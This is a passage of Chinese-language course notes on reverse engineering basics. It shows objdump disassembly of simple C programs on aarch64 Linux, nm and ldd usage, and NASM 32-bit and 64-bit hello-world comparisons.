     734:	52800020 	mov	w0, #0x1                   	// #1
     738:	39004260 	strb	w0, [x19, #16]
     73c:	f9400bf3 	ldr	x19, [sp, #16]
     740:	a8c27bfd 	ldp	x29, x30, [sp], #32
     744:	d65f03c0 	ret
     748:	d503201f 	nop
     74c:	d503201f 	nop

    0000000000000750 <frame_dummy>:
     750:	17ffffdc 	b	6c0 <register_tm_clones>

    0000000000000754 <main>:
    //PLAYGROUND.c
    #include <stdio.h>
    int main(){
     754:	a9bf7bfd 	stp	x29, x30, [sp, #-16]!
     758:	910003fd 	mov	x29, sp
       printf("Wu YiHung\n");
     75c:	90000000 	adrp	x0, 0 <__abi_tag-0x278>
     760:	911e4000 	add	x0, x0, #0x790
     764:	97ffffb3 	bl	630 <puts@plt>
       return 0;
     768:	52800000 	mov	w0, #0x0                   	// #0
    }
     76c:	a8c17bfd 	ldp	x29, x30, [sp], #16
     770:	d65f03c0 	ret

    Disassembly of section .fini:

    0000000000000774 <_fini>:
     774:	d503201f 	nop
     778:	a9bf7bfd 	stp	x29, x30, [sp, #-16]!
     77c:	910003fd 	mov	x29, sp
     780:	a8c17bfd 	ldp	x29, x30, [sp], #16
     784:	d65f03c0 	ret
    ```

- 反編譯4 ==> `objdump -S -j .text -M intel PLAYGROUND`

  - 結果4

    ```c++
    yih@yih:~/Documents/C$ objdump -S -j .text -M intel PLAYGROUND

    PLAYGROUND:     file format elf64-littleaarch64

    Disassembly of section .text:

    0000000000000640 <_start>:
     640:	objdump: unrecognised disassembler option: intel
    d503201f 	nop
     644:	d280001d 	mov	x29, #0x0                   	// #0
     648:	d280001e 	mov	x30, #0x0                   	// #0
     64c:	aa0003e5 	mov	x5, x0
     650:	f94003e1 	ldr	x1, [sp]
     654:	910023e2 	add	x2, sp, #0x8
     658:	910003e6 	mov	x6, sp
     65c:	90000080 	adrp	x0, 10000 <__FRAME_END__+0xf780>
     660:	f947f800 	ldr	x0, [x0, #4080]
     664:	d2800003 	mov	x3, #0x0                   	// #0
     668:	d2800004 	mov	x4, #0x0                   	// #0
     66c:	97ffffe1 	bl	5f0 <__libc_start_main@plt>
     670:	97ffffec 	bl	620 <abort@plt>

    0000000000000674 <call_weak_fn>:
     674:	90000080 	adrp	x0, 10000 <__FRAME_END__+0xf780>
     678:	f947f400 	ldr	x0, [x0, #4072]
     67c:	b4000040 	cbz	x0, 684 <call_weak_fn+0x10>
     680:	17ffffe4 	b	610 <__gmon_start__@plt>
     684:	d65f03c0 	ret
     688:	d503201f 	nop
     68c:	d503201f 	nop

    0000000000000690 <deregister_tm_clones>:
     690:	b0000080 	adrp	x0, 11000 <__data_start>
     694:	91004000 	add	x0, x0, #0x10
     698:	b0000081 	adrp	x1, 11000 <__data_start>
     69c:	91004021 	add	x1, x1, #0x10
     6a0:	eb00003f 	cmp	x1, x0
     6a4:	540000c0 	b.eq	6bc <deregister_tm_clones+0x2c>  // b.none
     6a8:	90000081 	adrp	x1, 10000 <__FRAME_END__+0xf780>
     6ac:	f947ec21 	ldr	x1, [x1, #4056]
     6b0:	b4000061 	cbz	x1, 6bc <deregister_tm_clones+0x2c>
     6b4:	aa0103f0 	mov	x16, x1
     6b8:	d61f0200 	br	x16
     6bc:	d65f03c0 	ret

    00000000000006c0 <register_tm_clones>:
     6c0:	b0000080 	adrp	x0, 11000 <__data_start>
     6c4:	91004000 	add	x0, x0, #0x10
     6c8:	b0000081 	adrp	x1, 11000 <__data_start>
     6cc:	91004021 	add	x1, x1, #0x10
     6d0:	cb000021 	sub	x1, x1, x0
     6d4:	d37ffc22 	lsr	x2, x1, #63
     6d8:	8b810c41 	add	x1, x2, x1, asr #3
     6dc:	9341fc21 	asr	x1, x1, #1
     6e0:	b40000c1 	cbz	x1, 6f8 <register_tm_clones+0x38>
     6e4:	90000082 	adrp	x2, 10000 <__FRAME_END__+0xf780>
     6e8:	f947fc42 	ldr	x2, [x2, #4088]
     6ec:	b4000062 	cbz	x2, 6f8 <register_tm_clones+0x38>
     6f0:	aa0203f0 	mov	x16, x2
     6f4:	d61f0200 	br	x16
     6f8:	d65f03c0 	ret
     6fc:	d503201f 	nop

    0000000000000700 <__do_global_dtors_aux>:
     700:	a9be7bfd 	stp	x29, x30, [sp, #-32]!
     704:	910003fd 	mov	x29, sp
     708:	f9000bf3 	str	x19, [sp, #16]
     70c:	b0000093 	adrp	x19, 11000 <__data_start>
     710:	39404260 	ldrb	w0, [x19, #16]
     714:	35000140 	cbnz	w0, 73c <__do_global_dtors_aux+0x3c>
     718:	90000080 	adrp	x0, 10000 <__FRAME_END__+0xf780>
     71c:	f947f000 	ldr	x0, [x0, #4064]
     720:	b4000080 	cbz	x0, 730 <__do_global_dtors_aux+0x30>
     724:	b0000080 	adrp	x0, 11000 <__data_start>
     728:	f9400400 	ldr	x0, [x0, #8]
     72c:	97ffffb5 	bl	600 <__cxa_finalize@plt>
     730:	97ffffd8 	bl	690 <deregister_tm_clones>
     734:	52800020 	mov	w0, #0x1                   	// #1
     738:	39004260 	strb	w0, [x19, #16]
     73c:	f9400bf3 	ldr	x19, [sp, #16]
     740:	a8c27bfd 	ldp	x29, x30, [sp], #32
     744:	d65f03c0 	ret
     748:	d503201f 	nop
     74c:	d503201f 	nop

    0000000000000750 <frame_dummy>:
     750:	17ffffdc 	b	6c0 <register_tm_clones>

    0000000000000754 <main>:
    //PLAYGROUND.c
    #include <stdio.h>
    int main(){
     754:	a9bf7bfd 	stp	x29, x30, [sp, #-16]!
     758:	910003fd 	mov	x29, sp
       printf("Wu YiHung\n");
     75c:	90000000 	adrp	x0, 0 <__abi_tag-0x278>
     760:	911e4000 	add	x0, x0, #0x790
     764:	97ffffb3 	bl	630 <puts@plt>
       return 0;
     768:	52800000 	mov	w0, #0x0                   	// #0
    }
     76c:	a8c17bfd 	ldp	x29, x30, [sp], #16
     770:	d65f03c0 	ret
    ```

- 反編譯5 ==> `objdump -S -j .text -M intel PLAYGROUND --no-show-raw-insn`

  - 結果5

    ```c++
    yih@yih:~/Documents/C$ objdump -S -j .text -M intel PLAYGROUND --no-show-raw-insn

    PLAYGROUND:     file format elf64-littleaarch64

    Disassembly of section .text:

    0000000000000640 <_start>:
     640:	objdump: unrecognised disassembler option: intel
    nop
     644:	mov	x29, #0x0                   	// #0
     648:	mov	x30, #0x0                   	// #0
     64c:	mov	x5, x0
     650:	ldr	x1, [sp]
     654:	add	x2, sp, #0x8
     658:	mov	x6, sp
     65c:	adrp	x0, 10000 <__FRAME_END__+0xf780>
     660:	ldr	x0, [x0, #4080]
     664:	mov	x3, #0x0                   	// #0
     668:	mov	x4, #0x0                   	// #0
     66c:	bl	5f0 <__libc_start_main@plt>
     670:	bl	620 <abort@plt>

    0000000000000674 <call_weak_fn>:
     674:	adrp	x0, 10000 <__FRAME_END__+0xf780>
     678:	ldr	x0, [x0, #4072]
     67c:	cbz	x0, 684 <call_weak_fn+0x10>
     680:	b	610 <__gmon_start__@plt>
     684:	ret
     688:	nop
     68c:	nop

    0000000000000690 <deregister_tm_clones>:
     690:	adrp	x0, 11000 <__data_start>
     694:	add	x0, x0, #0x10
     698:	adrp	x1, 11000 <__data_start>
     69c:	add	x1, x1, #0x10
     6a0:	cmp	x1, x0
     6a4:	b.eq	6bc <deregister_tm_clones+0x2c>  // b.none
     6a8:	adrp	x1, 10000 <__FRAME_END__+0xf780>
     6ac:	ldr	x1, [x1, #4056]
     6b0:	cbz	x1, 6bc <deregister_tm_clones+0x2c>
     6b4:	mov	x16, x1
     6b8:	br	x16
     6bc:	ret

    00000000000006c0 <register_tm_clones>:
     6c0:	adrp	x0, 11000 <__data_start>
     6c4:	add	x0, x0, #0x10
     6c8:	adrp	x1, 11000 <__data_start>
     6cc:	add	x1, x1, #0x10
     6d0:	sub	x1, x1, x0
     6d4:	lsr	x2, x1, #63
     6d8:	add	x1, x2, x1, asr #3
     6dc:	asr	x1, x1, #1
     6e0:	cbz	x1, 6f8 <register_tm_clones+0x38>
     6e4:	adrp	x2, 10000 <__FRAME_END__+0xf780>
     6e8:	ldr	x2, [x2, #4088]
     6ec:	cbz	x2, 6f8 <register_tm_clones+0x38>
     6f0:	mov	x16, x2
     6f4:	br	x16
     6f8:	ret
     6fc:	nop

    0000000000000700 <__do_global_dtors_aux>:
     700:	stp	x29, x30, [sp, #-32]!
     704:	mov	x29, sp
     708:	str	x19, [sp, #16]
     70c:	adrp	x19, 11000 <__data_start>
     710:	ldrb	w0, [x19, #16]
     714:	cbnz	w0, 73c <__do_global_dtors_aux+0x3c>
     718:	adrp	x0, 10000 <__FRAME_END__+0xf780>
     71c:	ldr	x0, [x0, #4064]
     720:	cbz	x0, 730 <__do_global_dtors_aux+0x30>
     724:	adrp	x0, 11000 <__data_start>
     728:	ldr	x0, [x0, #8]
     72c:	bl	600 <__cxa_finalize@plt>
     730:	bl	690 <deregister_tm_clones>
     734:	mov	w0, #0x1                   	// #1
     738:	strb	w0, [x19, #16]
     73c:	ldr	x19, [sp, #16]
     740:	ldp	x29, x30, [sp], #32
     744:	ret
     748:	nop
     74c:	nop

    0000000000000750 <frame_dummy>:
     750:	b	6c0 <register_tm_clones>

    0000000000000754 <main>:
    //PLAYGROUND.c
    #include <stdio.h>
    int main(){
     754:	stp	x29, x30, [sp, #-16]!
     758:	mov	x29, sp
       printf("Wu YiHung\n");
     75c:	adrp	x0, 0 <__abi_tag-0x278>
     760:	add	x0, x0, #0x790
     764:	bl	630 <puts@plt>
       return 0;
     768:	mov	w0, #0x0                   	// #0
    }
     76c:	ldp	x29, x30, [sp], #16
     770:	ret
    ```

  - 不顯示機器指令 ==\> --no-show-raw-insn

---

### 範例2

- 原始碼 PLAYGROUND.c
  ```c++
  //PLAYGROUND.c
  #include <stdio.h>
  int f(int x, int y){
    int sum = 0;
    sum += x;
    sum += y;
    return sum;
  }
  int main(){
    int a = 128, b = 64;
    printf("%d\n",f(a, b));
    return 0;
  }
  ```
- 編譯 `gcc -o PLAYGROUND PLAYGROUND.c -g`
- 反編譯(使用intel格式) ==> `objdump -D -M intel PLAYGROUND`
  - [結果](https://github.com/yih-0118/ProgSec/blob/05261f54d4b97292ab5e00a3b7fd3bdc0a5d48c2/2-4_objdump_1.md)
- 反編譯(使用intel格式+ 只要執行區段.text) ==> `objdump -D -M intel -j .text PLAYGROUND`
  - [結果](https://github.com/yih-0118/ProgSec/blob/b1c2caf3faf44407e52fa20381cc156c33cf7301/2-4_objdump_2.md)
- 反編譯 ==\> `objdump -D -M intel -j .text PLAYGROUND --no-show-raw-insn`
  - [結果](https://github.com/yih-0118/ProgSec/blob/48d9f6017d51d3ce53f4f33bf4a03afd051c97e6/2-4_objdump_3.md)
- 反編譯 ==\> `objdump -S -M intel -j .text PLAYGROUND --no-show-raw-insn`

  - [結果](https://github.com/yih-0118/ProgSec/blob/bd280f4fd86cfb8a099602025e49d17c8fd308ba/2-4_objdump_4.md)

    ```c++
    PLAYGROUND:     file format elf64-littleaarch64

    Disassembly of section .text:

    0000000000000640 <_start>:
     640:	objdump: unrecognised disassembler option: intel
    nop
     644:	mov	x29, #0x0                   	// #0
     648:	mov	x30, #0x0                   	// #0
     64c:	mov	x5, x0
     650:	ldr	x1, [sp]
     654:	add	x2, sp, #0x8
     658:	mov	x6, sp
     65c:	adrp	x0, 10000 <__FRAME_END__+0xf708>
     660:	ldr	x0, [x0, #4080]
     664:	mov	x3, #0x0                   	// #0
     668:	mov	x4, #0x0                   	// #0
     66c:	bl	5f0 <__libc_start_main@plt>
     670:	bl	620 <abort@plt>

    0000000000000674 <call_weak_fn>:
     674:	adrp	x0, 10000 <__FRAME_END__+0xf708>
     678:	ldr	x0, [x0, #4072]
     67c:	cbz	x0, 684 <call_weak_fn+0x10>
     680:	b	610 <__gmon_start__@plt>
     684:	ret
     688:	nop
     68c:	nop

    0000000000000690 <deregister_tm_clones>:
     690:	adrp	x0, 11000 <__data_start>
     694:	add	x0, x0, #0x10
     698:	adrp	x1, 11000 <__data_start>
     69c:	add	x1, x1, #0x10
     6a0:	cmp	x1, x0
     6a4:	b.eq	6bc <deregister_tm_clones+0x2c>  // b.none
     6a8:	adrp	x1, 10000 <__FRAME_END__+0xf708>
     6ac:	ldr	x1, [x1, #4056]
     6b0:	cbz	x1, 6bc <deregister_tm_clones+0x2c>
     6b4:	mov	x16, x1
     6b8:	br	x16
     6bc:	ret

    00000000000006c0 <register_tm_clones>:
     6c0:	adrp	x0, 11000 <__data_start>
     6c4:	add	x0, x0, #0x10
     6c8:	adrp	x1, 11000 <__data_start>
     6cc:	add	x1, x1, #0x10
     6d0:	sub	x1, x1, x0
     6d4:	lsr	x2, x1, #63
     6d8:	add	x1, x2, x1, asr #3
     6dc:	asr	x1, x1, #1
     6e0:	cbz	x1, 6f8 <register_tm_clones+0x38>
     6e4:	adrp	x2, 10000 <__FRAME_END__+0xf708>
     6e8:	ldr	x2, [x2, #4088]
     6ec:	cbz	x2, 6f8 <register_tm_clones+0x38>
     6f0:	mov	x16, x2
     6f4:	br	x16
     6f8:	ret
     6fc:	nop

    0000000000000700 <__do_global_dtors_aux>:
     700:	stp	x29, x30, [sp, #-32]!
     704:	mov	x29, sp
     708:	str	x19, [sp, #16]
     70c:	adrp	x19, 11000 <__data_start>
     710:	ldrb	w0, [x19, #16]
     714:	cbnz	w0, 73c <__do_global_dtors_aux+0x3c>
     718:	adrp	x0, 10000 <__FRAME_END__+0xf708>
     71c:	ldr	x0, [x0, #4064]
     720:	cbz	x0, 730 <__do_global_dtors_aux+0x30>
     724:	adrp	x0, 11000 <__data_start>
     728:	ldr	x0, [x0, #8]
     72c:	bl	600 <__cxa_finalize@plt>
     730:	bl	690 <deregister_tm_clones>
     734:	mov	w0, #0x1                   	// #1
     738:	strb	w0, [x19, #16]
     73c:	ldr	x19, [sp, #16]
     740:	ldp	x29, x30, [sp], #32
     744:	ret
     748:	nop
     74c:	nop

    0000000000000750 <frame_dummy>:
     750:	b	6c0 <register_tm_clones>

    0000000000000754 <f>:
    //PLAYGROUND.c
    #include <stdio.h>
    int f(int x, int y){
     754:	sub	sp, sp, #0x20
     758:	str	w0, [sp, #12]
     75c:	str	w1, [sp, #8]
      int sum = 0;
     760:	str	wzr, [sp, #28]
      sum += x;
     764:	ldr	w1, [sp, #28]
     768:	ldr	w0, [sp, #12]
     76c:	add	w0, w1, w0
     770:	str	w0, [sp, #28]
      sum += y;
     774:	ldr	w1, [sp, #28]
     778:	ldr	w0, [sp, #8]
     77c:	add	w0, w1, w0
     780:	str	w0, [sp, #28]
      return sum;
     784:	ldr	w0, [sp, #28]
    }
     788:	add	sp, sp, #0x20
     78c:	ret

    0000000000000790 <main>:
    int main(){
     790:	stp	x29, x30, [sp, #-32]!
     794:	mov	x29, sp
      int a = 128, b = 64;
     798:	mov	w0, #0x80                  	// #128
     79c:	str	w0, [sp, #24]
     7a0:	mov	w0, #0x40                  	// #64
     7a4:	str	w0, [sp, #28]
      printf("%d\n",f(a, b));
     7a8:	ldr	w1, [sp, #28]
     7ac:	ldr	w0, [sp, #24]
     7b0:	bl	754 <f>
     7b4:	mov	w1, w0
     7b8:	adrp	x0, 0 <__abi_tag-0x278>
     7bc:	add	x0, x0, #0x7f0
     7c0:	bl	630 <printf@plt>
      return 0;
     7c4:	mov	w0, #0x0                   	// #0
    }
     7c8:	ldp	x29, x30, [sp], #32
     7cc:	ret
    ```

---

# Linux 執行檔分析常用工具

## ldd 指令

- 用途 - 列出動態相依關係。
- 語法 `ldd FileName`
- 示範![image](https://hackmd.io/_uploads/SJObaIwqp.png)

## nm 指令

- 列出目標檔案(.o)的符號清單![image](https://hackmd.io/_uploads/rJbuZvv56.png)
- 查到的解釋意義==>[出處](https://linuxtools-rst.readthedocs.io/zh-cn/latest/tool/nm.html)
  ```
  -a或–debug-syms：顯示所有的符號，包括debugger-only symbols。
  -B：等同–formatxtbsd，用來相容MIPS的nm。
  -C或–demangle：將低階符號名稱解析(demangle)成使用者級名字。 這樣可以使得C++函數名具有可讀性。
  –no-demangle：預設的選項，不需要將低階符號名稱解析成使用者級名。
  -D或–dynamic：顯示動態符號。 該任選項僅對於動態目標(例如特定類型的共享庫)有意義。
  -f format：使用format格式輸出。 format可以選取bsd、sysv或posix，該選項在GNU的nm中有用。 預設為bsd。
  -g或–extern-only：僅顯示外部符號。
  -n、-v或–numeric-sort：依符號對應位址的順序排序，而非按符號名稱的字元順序。
  -p或–no-sort：依目標檔案中遇到的符號順序顯示，不排序。
  -P或–portability：使用POSIX.2標準輸出格式取代預設的輸出格式。 等同於使用任選項-f posix。
  -s或–print-armap：當列出庫中成員的符號時，包含索引。 索引的內容包含：哪些模組包含哪些名字的對應。
  -r或–reverse-sort：反轉排序的順序(例如，升序變成降序)。
  –size-sort：依大小排列符號順序。 該大小是按照一個符號的值與它下一個符號的值進行計算的。
  –targetxtbfdname：指定一個目標代碼的格式，而非使用系統的預設格式。
  -u或–undefined-only：僅顯示沒有定義的符號(那些外部符號)。
  –defined-only:僅顯示定義的符號。
  -l或–line-numbers：對每個符號，使用偵錯資訊來試圖找到檔案名稱和行號。
  -V或–version：顯示nm的版本號碼。
  –help：顯示nm的選項。
  ```

---

# 計算機結構與組合程式

- 1.機器碼(machine code| instruction set)與組合程式(assembly program)
- 2.計算機結構主題
- 3.組合語言與程式

## 線上反組譯服務 ==> [連結](https://defuse.ca/online-x86-assembler.htm)

- 測試範例: 55 8b ec 機器碼的組合語言為何?
- 結果![image](https://hackmd.io/_uploads/SyOOQPP5a.png)

---

# NASM(Netwide Assembler)組合程式設計

## NASM(Netwide Assembler)

- 官方文件 [https://www.nasm.us/xdoc/2.15/html/](https://www.nasm.us/xdoc/2.15/html/)
  [ ](https://github.com/MyFirstSecurity2020/ProgSec/blob/main/3-3.md#nasm%E9%96%8B%E7%99%BC%E7%92%B0%E5%A2%831%E7%B7%9A%E4%B8%8A%E9%96%8B%E7%99%BC%E7%92%B0%E5%A2%83)NASM開發環境1:線上開發環境

---

- myCompiler(64位元) [https://www.mycompiler.io/new/asm-x86_64](https://www.mycompiler.io/new/asm-x86_64)

## nasm程式範例

- 範例:費式序列:列印出90個費式序列
  - 資料來源:[https://cs.lmu.edu/~ray/notes/nasmtutorial/]
    ![image](https://hackmd.io/_uploads/HkgY8d_96.png)
  - `nasm -f elf64 PLAYGROUND.asm`
  - `gcc -o PLAYGROUND PLAYGROUND.o -no-pie`
  - `./PLAYGROUND`

## 32位元NASM與64位元NASM比較

- 原程式

```c++
#include <stdio.h>
int main(){
  printf("Yi-Hung Wu");
  return 0;
}
```

- 32位元NASM

```txt
section .data
    msg db "Yi-Hung Wu", 0

section .text
    global _start

_start:
    ; Call C library function to print the string
    push msg
    call printf

    ; Exit the program
    mov eax, 0       ; Return 0 status
    mov ebx, 0x1     ; Exit syscall number
    int 0x80         ; Call kernel
```

- 64位元NASM

```txt
section .data
    message db "Yi-Hung Wu", 10
    len equ $ - message

section .text
    global _start

_start:
    mov     rax, 1
    mov     rdi, 1
    mov     rsi, message
    mov     rdx, len
    syscall

    mov     rax, 60
    xor     rdi, rdi
    syscall
```

### 相互比較與說明

1. 圈出不同之處![image](https://hackmd.io/_uploads/Hyits5pnp.png)
2. ![image](https://hackmd.io/_uploads/Hk-y3qp26.png)

## 教材導讀

- GITHUB ==> [https://github.com/Apress/beginning-x64-assembly-programming/tree/master](https://github.com/Apress/beginning-x64-assembly-programming/tree/master)

- git clone [https://github.com/Apress/beginning-x64-assembly-programming.git](https://github.com/Apress/beginning-x64-assembly-programming.git) ![image](https://hackmd.io/_uploads/HyVGYdP9p.png)

- 結果
  ![image](https://hackmd.io/_uploads/Bkqov__q6.png)

### Chapter 01

- 組譯後並運行執行檔![image](https://hackmd.io/_uploads/B1_JKCD9p.png)

---

# C vs Assembly

- C 程式編譯成執行檔 == >
  - `gcc PLAYGROUND.c -o PLAYGROUND -g`
- 將執行檔逆向成組合語言 == \>
  - `objdump -S -j .text -M intel PLAYGROUND --no-show-raw-insn`

## 範例一（計算與先後）

- c

```c++
#include <stdio.h>
int main(){
  int x = 11203, y = 21004;
  printf("%d", (x++) + (++y));
  return 0;
}
```

- 編譯與執行結果![image](https://hackmd.io/_uploads/SkotCqP5a.png)

- assembly

```c++
0000000000000754 <main>:
#include <stdio.h>
int main(){
 754:	stp	x29, x30, [sp, #-32]!
 758:	mov	x29, sp

  int x = 11203, y = 21004;
 75c:	mov	w0, #0x2bc3            // 把11203 放到 w0
 760:	str	w0, [sp, #24]          // 在[sp+24]儲存 w0 (11203)
 764:	mov	w0, #0x520c            // 把21004 放到 w0
 768:	str	w0, [sp, #28]          // 在[sp+28]儲存w0 (21004)

  printf("%d", (x++) + (++y));
 76c:	ldr	w0, [sp, #24]          // 從[sp+24]輸入x的值到 w0
 770:	add	w1, w0, #0x1           // 將x增加1，結果儲存到w1
 774:	str	w1, [sp, #24]          // 在[sp+24]儲存x的更新值
 778:	ldr	w1, [sp, #28]          // 從[sp+28]輸入y的值到w1
 77c:	add	w1, w1, #0x1           // 將y增加1，結果儲存到w1
 780:	str	w1, [sp, #28]          // 在[sp+28]儲存y的更新值
 784:	ldr	w1, [sp, #28]          //輸入更新後的y到w1
 788:	add	w0, w0, w1            // 將更新後的x和y相加，結果儲存到w0
 78c:	mov	w1, w0                // 將結果複製到w1
 790:	adrp	x0, 0 <__abi_tag-0x278>
 794:	add	x0, x0, #0x7c8
 798:	bl	630 <printf@plt>

  // 返回 0 ，就是停止
  return 0;
 79c:	mov	w0, #0x0                // 將 0輸入寄存器 w0
}
 7a0:	ldp	x29, x30, [sp], #32
 7a4:	ret

```

## 範例二（if-else）

- c

```c++
#include<stdio.h>
int main(){
   int num;
   printf("Please enter a positive integer:");
   scanf("%d",&num);
   if (num%2==0){
     printf("The number you entered is an even number.");
   }
   else{
     printf("The number you entered is an odd number.");
   }
}
```

- 編譯與執行結果![image](https://hackmd.io/_uploads/Byak6hw5a.png)
- assembly

```c++
0000000000000894 <main>:
#include<stdio.h>
int main(){
 894:	stp	x29, x30, [sp, #-32]!
 898:	mov	x29, sp
 89c:	adrp	x0, 10000 <__FRAME_END__+0xf540>
 8a0:	ldr	x0, [x0, #4072]
 8a4:	ldr	x1, [x0]
 8a8:	str	x1, [sp, #24]
 8ac:	mov	x1, #0x0                   	// #0
   int num;
   printf("Please enter a positive integer:");
 8b0:	adrp	x0, 0 <__abi_tag-0x278>
 8b4:	add	x0, x0, #0x950
 8b8:	bl	750 <printf@plt>
   scanf("%d",&num);
 8bc:	add	x0, sp, #0x14
 8c0:	mov	x1, x0
 8c4:	adrp	x0, 0 <__abi_tag-0x278>
 8c8:	add	x0, x0, #0x978
 8cc:	bl	740 <__isoc99_scanf@plt>
   if (num%2==0){
 8d0:	ldr	w0, [sp, #20]
 8d4:	and	w0, w0, #0x1
 8d8:	cmp	w0, #0x0
 8dc:	b.ne	8f0 <main+0x5c>  // b.any
     printf("The number you entered is an even number.");
 8e0:	adrp	x0, 0 <__abi_tag-0x278>
 8e4:	add	x0, x0, #0x980
 8e8:	bl	750 <printf@plt>
 8ec:	b	8fc <main+0x68>
   }
   else{
     printf("The number you entered is an odd number.");
 8f0:	adrp	x0, 0 <__abi_tag-0x278>
 8f4:	add	x0, x0, #0x9b0
 8f8:	bl	750 <printf@plt>
 8fc:	mov	w0, #0x0                   	// #0
 900:	mov	w1, w0
   }
}
 904:	adrp	x0, 10000 <__FRAME_END__+0xf540>
 908:	ldr	x0, [x0, #4072]
 90c:	ldr	x3, [sp, #24]
 910:	ldr	x2, [x0]
 914:	subs	x3, x3, x2
 918:	mov	x2, #0x0                   	// #0
 91c:	b.eq	924 <main+0x90>  // b.none
 920:	bl	710 <__stack_chk_fail@plt>
 924:	mov	w0, w1
 928:	ldp	x29, x30, [sp], #32
 92c:	ret
```

## 範例三（LOOP）

- c

```c++
//FOR LOOP
#include <stdio.h>
int main(){
   int n, i, sum = 1; //由於是階乘，故sum = 1 必為預設
   printf("Enter a positive integer: ");
   scanf("%d", &n);
   for (i = 1; i <= n; ++i){
       sum *= i;
   }
   printf("Sum = %d", sum);
   return 0;
}
```

- 編譯與執行結果![image](https://hackmd.io/_uploads/rJ5KJpDca.png)
  ![image](https://hackmd.io/_uploads/Hkl0kaw9p.png)
- assembly

```c++
0000000000000894 <main>:
//FOR LOOP
#include <stdio.h>
int main(){
 894:	stp	x29, x30, [sp, #-48]!
 898:	mov	x29, sp
 89c:	adrp	x0, 10000 <__FRAME_END__+0xf578>
 8a0:	ldr	x0, [x0, #4072]
 8a4:	ldr	x1, [x0]
 8a8:	str	x1, [sp, #40]
 8ac:	mov	x1, #0x0                   	// #0
   int n, i, sum = 1; //由於是階乘，故sum = 1 必為預設
 8b0:	mov	w0, #0x1                   	// #1
 8b4:	str	w0, [sp, #36]
   printf("Enter a positive integer: ");
 8b8:	adrp	x0, 0 <__abi_tag-0x278>
 8bc:	add	x0, x0, #0x970
 8c0:	bl	750 <printf@plt>
   scanf("%d", &n);
 8c4:	add	x0, sp, #0x1c
 8c8:	mov	x1, x0
 8cc:	adrp	x0, 0 <__abi_tag-0x278>
 8d0:	add	x0, x0, #0x990
 8d4:	bl	740 <__isoc99_scanf@plt>
   for (i = 1; i <= n; ++i){
 8d8:	mov	w0, #0x1                   	// #1
 8dc:	str	w0, [sp, #32]
 8e0:	b	900 <main+0x6c>
       sum *= i;
 8e4:	ldr	w1, [sp, #36]
 8e8:	ldr	w0, [sp, #32]
 8ec:	mul	w0, w1, w0
 8f0:	str	w0, [sp, #36]
   for (i = 1; i <= n; ++i){
 8f4:	ldr	w0, [sp, #32]
 8f8:	add	w0, w0, #0x1
 8fc:	str	w0, [sp, #32]
 900:	ldr	w0, [sp, #28]
 904:	ldr	w1, [sp, #32]
 908:	cmp	w1, w0
 90c:	b.le	8e4 <main+0x50>
   }
   printf("Sum = %d", sum);
 910:	ldr	w1, [sp, #36]
 914:	adrp	x0, 0 <__abi_tag-0x278>
 918:	add	x0, x0, #0x998
 91c:	bl	750 <printf@plt>
   return 0;
 920:	mov	w0, #0x0                   	// #0
}
 924:	mov	w1, w0
 928:	adrp	x0, 10000 <__FRAME_END__+0xf578>
 92c:	ldr	x0, [x0, #4072]
 930:	ldr	x3, [sp, #40]
 934:	ldr	x2, [x0]
 938:	subs	x3, x3, x2
 93c:	mov	x2, #0x0                   	// #0
 940:	b.eq	948 <main+0xb4>  // b.none
 944:	bl	710 <__stack_chk_fail@plt>
 948:	mov	w0, w1
 94c:	ldp	x29, x30, [sp], #48
 950:	ret
```

- c

```c++
//WHILE LOOP
#include <stdio.h>
int main(){
   int n, i, sum = 1;
   printf("Enter a positive integer: ");
   scanf("%d", &n);
   i = 1;
   while (i <= n){
       sum *= i;
       ++i;
   }
   printf("Sum = %d", sum);
   return 0;
}
```

- 編譯與執行結果![image](https://hackmd.io/_uploads/Sk7ogpv96.png)![image](https://hackmd.io/_uploads/HkRk-pDc6.png)
  - assembly

```c++
0000000000000894 <main>:
//WHILE LOOP
#include <stdio.h>
int main(){
 894:	stp	x29, x30, [sp, #-48]!
 898:	mov	x29, sp
 89c:	adrp	x0, 10000 <__FRAME_END__+0xf578>
 8a0:	ldr	x0, [x0, #4072]
 8a4:	ldr	x1, [x0]
 8a8:	str	x1, [sp, #40]
 8ac:	mov	x1, #0x0                   	// #0
   int n, i, sum = 1;
 8b0:	mov	w0, #0x1                   	// #1
 8b4:	str	w0, [sp, #36]
   printf("Enter a positive integer: ");
 8b8:	adrp	x0, 0 <__abi_tag-0x278>
 8bc:	add	x0, x0, #0x970
 8c0:	bl	750 <printf@plt>
   scanf("%d", &n);
 8c4:	add	x0, sp, #0x1c
 8c8:	mov	x1, x0
 8cc:	adrp	x0, 0 <__abi_tag-0x278>
 8d0:	add	x0, x0, #0x990
 8d4:	bl	740 <__isoc99_scanf@plt>
   i = 1;
 8d8:	mov	w0, #0x1                   	// #1
 8dc:	str	w0, [sp, #32]
   while (i <= n){
 8e0:	b	900 <main+0x6c>
       sum *= i;
 8e4:	ldr	w1, [sp, #36]
 8e8:	ldr	w0, [sp, #32]
 8ec:	mul	w0, w1, w0
 8f0:	str	w0, [sp, #36]
       ++i;
 8f4:	ldr	w0, [sp, #32]
 8f8:	add	w0, w0, #0x1
 8fc:	str	w0, [sp, #32]
   while (i <= n){
 900:	ldr	w0, [sp, #28]
 904:	ldr	w1, [sp, #32]
 908:	cmp	w1, w0
 90c:	b.le	8e4 <main+0x50>
   }
   printf("Sum = %d", sum);
 910:	ldr	w1, [sp, #36]
 914:	adrp	x0, 0 <__abi_tag-0x278>
 918:	add	x0, x0, #0x998
 91c:	bl	750 <printf@plt>
   return 0;
 920:	mov	w0, #0x0                   	// #0
}
 924:	mov	w1, w0
 928:	adrp	x0, 10000 <__FRAME_END__+0xf578>
 92c:	ldr	x0, [x0, #4072]
 930:	ldr	x3, [sp, #40]
 934:	ldr	x2, [x0]
 938:	subs	x3, x3, x2
 93c:	mov	x2, #0x0                   	// #0
 940:	b.eq	948 <main+0xb4>  // b.none
 944:	bl	710 <__stack_chk_fail@plt>
 948:	mov	w0, w1
 94c:	ldp	x29, x30, [sp], #48
 950:	ret
```

- c

```c++
//DO While LOOP
#include <stdio.h>
int main() {
   int n, i, sum = 1;
   printf("Enter a positive integer: ");
   scanf("%d", &n);
   i = 1;
   do{
     sum *= i;
     ++i;
   } while (i <= n);
   printf("Sum = %d", sum);
   return 0;
}
```

- 編譯與執行結果![image](https://hackmd.io/_uploads/HyiIW6v9a.png)![image](https://hackmd.io/_uploads/H1_YZpvcT.png)

  - assembly

```c++
0000000000000894 <main>:
//DO While LOOP
#include <stdio.h>
int main() {
 894:	stp	x29, x30, [sp, #-48]!
 898:	mov	x29, sp
